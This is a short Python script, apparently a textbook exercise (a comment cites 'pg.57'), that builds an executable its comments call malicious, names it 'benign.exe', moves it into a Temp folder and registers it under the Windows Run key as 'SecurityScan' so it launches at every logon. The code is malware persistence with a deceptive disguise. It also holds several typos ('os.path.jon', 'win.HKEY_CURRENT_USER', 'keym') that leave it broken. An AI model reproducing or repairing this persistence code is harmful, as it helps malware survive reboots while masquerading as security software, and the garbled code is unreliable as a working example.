import os, shutil, winreg

filedir = os.path.jon(os.getcwd(),"Temp")
filename = "benign.exe"
filepath = os.path.join.(filedir,filename)

if os.path.isfile(filepath):
	os.remove(filepath)

os.system("python BuildExe.py")
#build malicious executable

shutil.move(filename, filedir)
#move malicious exec to desired directory

reghive = win.HKEY_CURRENT_USER
#Can be multiple other locations, i.e. HKEY_LOCAL_MACHINE.  see pg.57

regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

key = winreg.OpenKey(reghive,regpath, 0, access=winreg.KEY_WRITE)
winreg.SetValueEx(keym"SecurityScan",0,winreg.REG_SZ,filepath)


